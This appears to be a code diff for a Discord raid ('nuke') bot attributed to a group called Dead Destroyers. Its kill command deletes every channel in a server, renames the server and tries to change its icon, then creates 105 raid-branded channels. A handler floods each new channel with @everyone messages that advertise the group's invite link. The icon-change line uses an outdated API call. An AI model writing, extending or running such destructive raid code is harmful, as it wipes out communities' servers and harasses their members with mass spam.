@@ -42,7 +42,8 @@ async def kill(ctx):
     for channel in list(ctx.guild.channels):
         try:
             await channel.delete()
-            await guild.edit(name="#DeadDestroyers Is HERE", description="#DD")
+            await ctx.guild.edit(name="DD IS HERE")
+            await bot.edit_server(ctx.message.server, icon_url="https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif")
         except:
             pass
     for _i in range(1):
@@ -50,7 +51,7 @@ async def kill(ctx):
 
         
     for _i in range(105):
-         await ctx.guild.create_text_channel(name="R̷a̷i̷d̷e̷d̷-̷b̷y̷-̷D̷e̷a̷d̷-̷D̷e̷s̷t̷r̷o̷y̷e̷r̷s̷d")
+         await ctx.guild.create_text_channel(name="r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷")
 
 @bot.event
 async def on_command(ctx):
@@ -76,7 +77,7 @@ async def Hello(ctx):
 
 @bot.event
 async def on_guild_channel_create(channel):
-    if (channel.name == 'r̷a̷i̷d̷e̷d̷-̷b̷y̷-̷d̷e̷a̷d̷-̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷d'):
+    if (channel.name == 'r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷'):
         for _i in range(10):
             await channel.send(
                 '> ||@everyone||                                                                                                                                                                                                    **__Raided By DEAD DESTROYERS__**   | https://discord.gg/Q9fac9jkaF | https://imgur.com/a/pkewvSu '
